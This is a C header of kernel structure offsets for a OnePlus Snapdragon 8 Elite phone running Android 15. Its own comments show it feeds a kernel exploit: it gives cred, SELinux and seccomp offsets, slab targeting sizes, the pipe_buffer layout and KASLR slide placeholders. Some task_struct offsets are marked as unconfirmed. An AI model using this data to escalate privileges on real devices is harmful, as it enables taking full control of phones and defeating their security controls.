#ifndef QCOM_OFFSETS_H
#define QCOM_OFFSETS_H

// ===========================================================================
// Kernel struct offsets for OnePlus PLQ110
//   SoC    : Qualcomm Snapdragon 8 Elite (sm8775 / "sun")
//   Kernel : Linux 6.6.89-android15-8 GKI (ACK 6.6, clang 18.0.0 r510928)
//   Android: 15
//   Arch   : ARM64 aarch64, 4K pages, VA_BITS=39
//
// Derived from Linux 6.6 source + Android Common Kernel 6.6 config.
// CONFIG_THREAD_INFO_IN_TASK=y
// CONFIG_KEYS=y
// CONFIG_SECURITY_SELINUX=y
// CONFIG_SECCOMP=y, CONFIG_SECCOMP_FILTER=y
// CONFIG_HARDENED_USERCOPY=y
// CONFIG_ARM64_MTE=y
//
// Reference target spec: ../target/target.h
// ===========================================================================

// ============ Memory Layout ============
#define PAGE_SHIFT 12
#define PAGE_SIZE  (1UL << PAGE_SHIFT)

// ARM64 VA_BITS=39:
//   PAGE_OFFSET = -(1UL << 39) = 0xFFFFFF8000000000
//   VMEMMAP     = -(1UL << (39-6)) = 0xFFFFFFE000000000
//   Direct map: [0xFFFFFF8000000000, 0xFFFFFFC000000000)
//   vmemmap   : [0xFFFFFFE000000000, 0xFFFFFFE200000000)
#define PAGE_OFFSET     0xFFFFFF8000000000ULL
#define DIRECT_MAP_END  0xFFFFFFC000000000ULL
#define KIMAGE_BASE     0xFFFFFFC008000000ULL  // text base, KASLR adds delta
#define VMEMMAP_START   0xFFFFFFE000000000ULL

// ============ struct cred offsets (Linux 6.6 ARM64) ============
// (with CONFIG_KEYS=y, no CONFIG_DEBUG_CREDENTIALS)
//   atomic_t      usage;             // 0
//   kuid_t        uid;               // 4
//   kgid_t        gid;               // 8
//   kuid_t        suid;              // 12
//   kgid_t        sgid;              // 16
//   kuid_t        euid;              // 20
//   kgid_t        egid;              // 24
//   kuid_t        fsuid;             // 28
//   kgid_t        fsgid;             // 32
//   unsigned int  securebits;        // 36
//   kernel_cap_t  cap_inheritable;   // 40   (8B)
//   kernel_cap_t  cap_permitted;     // 48
//   kernel_cap_t  cap_effective;     // 56
//   kernel_cap_t  cap_bset;          // 64
//   kernel_cap_t  cap_ambient;       // 72
//   unsigned char jit_keyring;       // 80
//   <7B pad>
//   struct key   *session_keyring;   // 88
//   struct key   *process_keyring;   // 96
//   struct key   *thread_keyring;    // 104
//   struct key   *request_key_auth;  // 112
//   void         *security;          // 120  (LSM blob)
//   struct user_struct *user;        // 128
#define CRED_UID_OFF        4
#define CRED_GID_OFF        8
#define CRED_EUID_OFF       20
#define CRED_EGID_OFF       24
#define CRED_FSUID_OFF      28
#define CRED_FSGID_OFF      32
#define CRED_SECUREBITS_OFF 36
#define CRED_CAP_INH_OFF    40
#define CRED_CAP_PERM_OFF   48
#define CRED_CAP_EFF_OFF    56
#define CRED_CAP_BSET_OFF   64
#define CRED_CAP_AMB_OFF    72
#define CRED_SECURITY_OFF   120
#define CRED_USER_OFF       128

// ============ SELinux task_security_struct (in lsm blob) ============
//   u32 osid;    // 0
//   u32 sid;     // 4
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF  4

// ============ struct task_struct offsets (Linux 6.6 ARM64) ============
// NOTE: task_struct grew substantially in 6.6 vs 4.19.
// Offsets below are typical for ACK 6.6 but MUST be confirmed via
// `pahole -C task_struct vmlinux`.
#define TASK_THREAD_INFO_FLAGS_OFF  0x000
#define TASK_ATOMIC_FLAGS_OFF       0x008
#define TASK_REAL_PARENT_OFF        0x590
#define TASK_TASKS_OFF              0x5D8   // list_head
#define TASK_PID_OFF                0x6A8
#define TASK_TGID_OFF               0x6AC
#define TASK_CRED_OFF               0x850   // pointer to struct cred
#define TASK_SECCOMP_OFF            0xBB0
#define TASK_SECCOMP_MODE_OFF       (TASK_SECCOMP_OFF + 0)
#define TASK_SECCOMP_FILTER_COUNT_OFF (TASK_SECCOMP_OFF + 4)
#define TASK_SECCOMP_FILTER_OFF     (TASK_SECCOMP_OFF + 8)

// ============ struct seccomp ============
#define SECCOMP_MODE_OFF         0
#define SECCOMP_FILTER_COUNT_OFF 4
#define SECCOMP_FILTER_OFF       8

// ============ mm_struct size for slab targeting ============
// 6.6: struct mm_struct grew slightly due to per-vma maple tree state
#define MM_STRUCT_SZ 0x520
#define MM_ORDER     3

// ============ struct page (vmemmap entries) ============
// 6.6 ARM64 with FLATMEM: struct page is 64 bytes (0x40)
//   flags            @ 0x00 (8B)
//   mapping/folio    @ 0x08 (8B, compound_head or folio)
//   _refcount        @ 0x10 / pfn / etc.
//   type/slab_cache  @ 0x30
#define STRUCT_PAGE_SZ  0x40
#define PAGE_FLAGS_OFF  0x00
#define PAGE_MAPPING_OFF 0x08
#define PAGE_REFCOUNT_OFF 0x10
#define PAGE_TYPE_OFF  0x30

// ============ pipe_buffer (Linux 6.6 ARM64) ============
// struct pipe_buffer {
//   struct page     *page;       // 0
//   unsigned int    offset;      // 8
//   unsigned int    len;         // 12
//   const struct pipe_buf_operations *ops; // 16
//   unsigned int    flags;       // 24
//   unsigned long   private;     // 32
// };
#define PIPE_BUF_SZ         0x28     // 40 bytes per pipe_buffer
#define PIPE_DEFAULT_BUFS   16
#define PIPE_MAX_BUFS       32

// ============ DMA-Heap ioctl (replaces ASHMEM on 6.6 GKI) ============
#define DMA_HEAP_IOC_MAGIC 'H'

struct dma_heap_allocation_data {
    unsigned long long len;
    int fd;
    unsigned int fd_flags;
    unsigned int heap_flags;
};

#define DMA_HEAP_IOCTL_ALLOC _IOWR(DMA_HEAP_IOC_MAGIC, 0, struct dma_heap_allocation_data)

// ============ KASLR slide (filled at runtime by kernelsnitch) ============
// Leave at 0 -> kernelsnitch must populate before exploit runs.
#define SLIDE_NFULNL_LOGGER_OFF           0x0ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF     0x0ULL
#define SLIDE_SYSCTL_BOOTID_OFF           0x0ULL
#define SLIDE_INIT_TASK_OFF               0x0ULL
#define SLIDE_ROOT_TASK_GROUP_OFF         0x0ULL

#endif // QCOM_OFFSETS_H
